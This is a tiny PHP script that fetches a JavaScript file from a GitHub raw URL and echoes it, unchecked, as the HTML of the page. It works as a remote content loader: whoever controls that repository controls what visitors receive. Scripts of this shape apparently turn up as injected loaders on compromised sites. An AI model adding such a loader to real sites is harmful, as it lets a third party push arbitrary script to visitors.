<?php
header("Content-Type: text/html; charset=UTF-8");
$githubRawUrl = 'https://raw.githubusercontent.com/shafafery/shafafery.github.io/refs/heads/main/js/engustedusd.js';
$content = file_get_contents($githubRawUrl);
echo $content;
?>
